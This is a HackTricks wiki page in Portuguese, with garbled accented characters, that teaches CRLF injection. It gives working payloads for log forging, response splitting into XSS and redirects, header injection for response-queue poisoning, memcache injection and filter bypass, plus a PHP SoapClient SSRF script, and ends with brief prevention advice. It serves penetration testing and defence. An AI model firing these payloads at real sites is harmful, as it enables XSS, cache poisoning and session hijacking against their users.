# CRLF (%0D%0A) Injection

{% hint style="success" %}
Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR) e Line Feed (LF), coletivamente conhecidos como CRLF, s√£o sequ√™ncias de caracteres especiais usadas no protocolo HTTP para denotar o fim de uma linha ou o in√≠cio de uma nova. Servidores web e navegadores usam CRLF para distinguir entre cabe√ßalhos HTTP e o corpo de uma resposta. Esses caracteres s√£o universalmente empregados em comunica√ß√µes HTTP/1.1 em v√°rios tipos de servidores web, como Apache e Microsoft IIS.

### Vulnerabilidade de Inje√ß√£o CRLF

A inje√ß√£o CRLF envolve a inser√ß√£o de caracteres CR e LF em entradas fornecidas pelo usu√°rio. Essa a√ß√£o engana o servidor, aplicativo ou usu√°rio, fazendo com que interpretem a sequ√™ncia injetada como o fim de uma resposta e o in√≠cio de outra. Embora esses caracteres n√£o sejam inerentemente prejudiciais, seu uso indevido pode levar √† divis√£o de resposta HTTP e outras atividades maliciosas.

### Exemplo: Inje√ß√£o CRLF em um Arquivo de Log

[Exemplo daqui](https://www.invicti.com/blog/web-security/crlf-http-header/)

Considere um arquivo de log em um painel de administra√ß√£o que segue o formato: `IP - Hora - Caminho Visitado`. Uma entrada t√≠pica pode parecer:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Um atacante pode explorar uma inje√ß√£o CRLF para manipular este log. Ao injetar caracteres CRLF na solicita√ß√£o HTTP, o atacante pode alterar o fluxo de sa√≠da e fabricar entradas de log. Por exemplo, uma sequ√™ncia injetada pode transformar a entrada do log em:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Aqui, `%0d` e `%0a` representam as formas codificadas em URL de CR e LF. Ap√≥s o ataque, o log exibiria de forma enganosa:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
O atacante, assim, encobre suas atividades maliciosas fazendo parecer que o localhost (uma entidade tipicamente confi√°vel dentro do ambiente do servidor) realizou as a√ß√µes. O servidor interpreta a parte da consulta que come√ßa com `%0d%0a` como um √∫nico par√¢metro, enquanto o par√¢metro `restrictedaction` √© analisado como outra entrada separada. A consulta manipulada efetivamente imita um comando administrativo leg√≠timo: `/index.php?page=home&restrictedaction=edit`

### HTTP Response Splitting

#### Descri√ß√£o

HTTP Response Splitting √© uma vulnerabilidade de seguran√ßa que surge quando um atacante explora a estrutura das respostas HTTP. Essa estrutura separa os cabe√ßalhos do corpo usando uma sequ√™ncia de caracteres espec√≠fica, Carriage Return (CR) seguido por Line Feed (LF), coletivamente chamados de CRLF. Se um atacante conseguir inserir uma sequ√™ncia CRLF em um cabe√ßalho de resposta, ele pode efetivamente manipular o conte√∫do da resposta subsequente. Esse tipo de manipula√ß√£o pode levar a s√©rios problemas de seguran√ßa, notavelmente Cross-site Scripting (XSS).

#### XSS atrav√©s de HTTP Response Splitting

1. A aplica√ß√£o define um cabe√ßalho personalizado assim: `X-Custom-Header: UserInput`
2. A aplica√ß√£o busca o valor para `UserInput` de um par√¢metro de consulta, digamos "user\_input". Em cen√°rios que carecem de valida√ß√£o e codifica√ß√£o adequadas de entrada, um atacante pode criar um payload que inclui a sequ√™ncia CRLF, seguida de conte√∫do malicioso.
3. Um atacante cria uma URL com um 'user\_input' especialmente elaborado: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* Nesta URL, `%0d%0a%0d%0a` √© a forma codificada em URL de CRLFCRLF. Isso engana o servidor para inserir uma sequ√™ncia CRLF, fazendo com que o servidor trate a parte subsequente como o corpo da resposta.
4. O servidor reflete a entrada do atacante no cabe√ßalho da resposta, levando a uma estrutura de resposta n√£o intencional onde o script malicioso √© interpretado pelo navegador como parte do corpo da resposta.

#### Um exemplo de HTTP Response Splitting levando a Redirecionamento

De [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Navegador para:
```
/%0d%0aLocation:%20http://myweb.com
```
E o servidor responde com o cabe√ßalho:
```
Location: http://myweb.com
```
**Outro exemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### No Caminho da URL

Voc√™ pode enviar o payload **dentro do caminho da URL** para controlar a **resposta** do servidor (exemplo de [aqui](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Confira mais exemplos em:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Inje√ß√£o de Cabe√ßalho HTTP

A Inje√ß√£o de Cabe√ßalho HTTP, frequentemente explorada atrav√©s da inje√ß√£o CRLF (Carriage Return e Line Feed), permite que atacantes insiram cabe√ßalhos HTTP. Isso pode comprometer mecanismos de seguran√ßa, como filtros XSS (Cross-Site Scripting) ou o SOP (Same-Origin Policy), potencialmente levando ao acesso n√£o autorizado a dados sens√≠veis, como tokens CSRF, ou √† manipula√ß√£o de sess√µes de usu√°rio atrav√©s do plantio de cookies.

#### Explorando CORS via Inje√ß√£o de Cabe√ßalho HTTP

Um atacante pode injetar cabe√ßalhos HTTP para habilitar CORS (Cross-Origin Resource Sharing), contornando as restri√ß√µes impostas pelo SOP. Essa viola√ß√£o permite que scripts de origens maliciosas interajam com recursos de uma origem diferente, potencialmente acessando dados protegidos.

#### SSRF e Inje√ß√£o de Requisi√ß√£o HTTP via CRLF

A inje√ß√£o CRLF pode ser utilizada para criar e injetar uma nova requisi√ß√£o HTTP. Um exemplo not√°vel disso √© a vulnerabilidade na classe `SoapClient` do PHP, especificamente dentro do par√¢metro `user_agent`. Ao manipular esse par√¢metro, um atacante pode inserir cabe√ßalhos adicionais e conte√∫do do corpo, ou at√© mesmo injetar uma nova requisi√ß√£o HTTP completamente. Abaixo est√° um exemplo em PHP demonstrando essa explora√ß√£o:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Inje√ß√£o de Cabe√ßalho para Furtos de Requisi√ß√£o

Para mais informa√ß√µes sobre esta t√©cnica e problemas potenciais [**verifique a fonte original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Voc√™ pode injetar cabe√ßalhos essenciais para garantir que o **back-end mantenha a conex√£o aberta** ap√≥s responder √† requisi√ß√£o inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Depois, uma segunda solicita√ß√£o pode ser especificada. Este cen√°rio geralmente envolve [HTTP request smuggling](http-request-smuggling/), uma t√©cnica onde cabe√ßalhos ou elementos de corpo extras adicionados pelo servidor ap√≥s a inje√ß√£o podem levar a v√°rias explora√ß√µes de seguran√ßa.

**Explora√ß√£o:**

1. **Inje√ß√£o de Prefixo Malicioso**: Este m√©todo envolve envenenar a solicita√ß√£o do pr√≥ximo usu√°rio ou um cache da web especificando um prefixo malicioso. Um exemplo disso √©:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Criando um Prefixo para Envenenamento da Fila de Respostas**: Esta abordagem envolve criar um prefixo que, quando combinado com lixo no final, forma uma segunda solicita√ß√£o completa. Isso pode acionar o envenenamento da fila de respostas. Um exemplo √©:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Inje√ß√£o de Memcache

Memcache √© um **armazenamento de chave-valor que usa um protocolo de texto claro**. Mais informa√ß√µes em:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Para informa√ß√µes completas, leia o**[ **artigo original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Se uma plataforma estiver **pegando dados de uma solicita√ß√£o HTTP e usando-os sem sanitiza√ß√£o** para realizar **solicita√ß√µes** a um servidor **memcache**, um atacante poderia abusar desse comportamento para **injetar novos comandos memcache**.

Por exemplo, na vulnerabilidade descoberta originalmente, chaves de cache foram usadas para retornar o IP e a porta que um usu√°rio deveria conectar, e os atacantes conseguiram **injetar comandos memcache** que **envenenariam** o **cache para enviar os detalhes das v√≠timas** (nomes de usu√°rio e senhas inclu√≠dos) para os servidores do atacante:

<figure><img src="../.gitbook/assets/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Al√©m disso, os pesquisadores tamb√©m descobriram que poderiam desincronizar as respostas do memcache para enviar o IP e as portas dos atacantes para usu√°rios cujo e-mail o atacante n√£o conhecia:

<figure><img src="../.gitbook/assets/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### Como Prevenir Inje√ß√µes CRLF / HTTP Header em Aplica√ß√µes Web

Para mitigar os riscos de inje√ß√µes CRLF (Carriage Return e Line Feed) ou inje√ß√µes de cabe√ßalho HTTP em aplica√ß√µes web, as seguintes estrat√©gias s√£o recomendadas:

1. **Evitar Entrada Direta do Usu√°rio em Cabe√ßalhos de Resposta:** A abordagem mais segura √© evitar incorporar a entrada fornecida pelo usu√°rio diretamente nos cabe√ßalhos de resposta.
2. **Codificar Caracteres Especiais:** Se evitar a entrada direta do usu√°rio n√£o for vi√°vel, certifique-se de empregar uma fun√ß√£o dedicada √† codifica√ß√£o de caracteres especiais como CR (Carriage Return) e LF (Line Feed). Esta pr√°tica previne a possibilidade de inje√ß√£o CRLF.
3. **Atualizar Linguagem de Programa√ß√£o:** Atualize regularmente a linguagem de programa√ß√£o usada em suas aplica√ß√µes web para a vers√£o mais recente. Opte por uma vers√£o que inherentemente n√£o permita a inje√ß√£o de caracteres CR e LF dentro das fun√ß√µes encarregadas de definir cabe√ßalhos HTTP.

### CHEATSHEET

[Cheatsheet from here](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Ferramentas Autom√°ticas

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista de Detec√ß√£o de For√ßa Bruta

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Refer√™ncias

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma **plataforma de bug bounty premium criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
